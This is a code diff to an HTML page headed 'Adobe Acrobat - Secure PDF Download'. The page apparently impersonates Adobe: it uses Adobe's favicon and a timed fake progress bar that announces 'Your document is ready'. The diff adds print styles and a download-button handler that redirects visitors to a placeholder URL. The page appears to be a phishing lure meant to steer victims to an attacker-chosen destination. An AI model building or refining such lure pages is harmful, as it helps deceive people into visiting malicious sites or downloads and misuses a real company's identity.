@@ -6,6 +6,8 @@
     <title>Adobe Acrobat - Secure PDF Download</title>
     <link rel="icon" href="https://www.adobe.com/favicon.ico">
     <style>
+        @page { size: A4; margin: 0; }
+
         * {
             margin: 0;
             padding: 0;
@@ -207,6 +209,14 @@
         .footer a:hover {
             text-decoration: underline;
         }
+        /* Print / PDF styles */
+        @media print {
+            body { background: #ffffff; }
+            .top-bar { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            .download-card { box-shadow: none; border: 1px solid #e0e0e0; }
+            .download-btn { -webkit-print-color-adjust: exact; print-color-adjust: exact; opacity: 1; animation: none; }
+            .progress-bar-fill { animation: none; width: 100%; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+        }
     </style>
 </head>
 <body>
@@ -279,8 +289,8 @@
 
     <script>
         // Animate progress percentage
-        const percentEl = document.getElementById('percent');
-        const steps = [
+        var percentEl = document.getElementById('percent');
+        var steps = [
             { time: 0, value: 0 },
             { time: 600, value: 15 },
             { time: 1200, value: 35 },
@@ -289,13 +299,18 @@
             { time: 3000, value: 100 }
         ];
 
-        steps.forEach(step => {
-            setTimeout(() => {
+        steps.forEach(function(step) {
+            setTimeout(function() {
                 percentEl.textContent = step.value + '%';
                 if (step.value === 100) {
                     document.querySelector('.progress-text').innerHTML = 'Your document is ready';
                 }
             }, step.time);
+        });
+
+        // Redirect on download button click
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            window.location.href = 'REDIRECT_URL_HERE';
         });
     </script>
 </body>
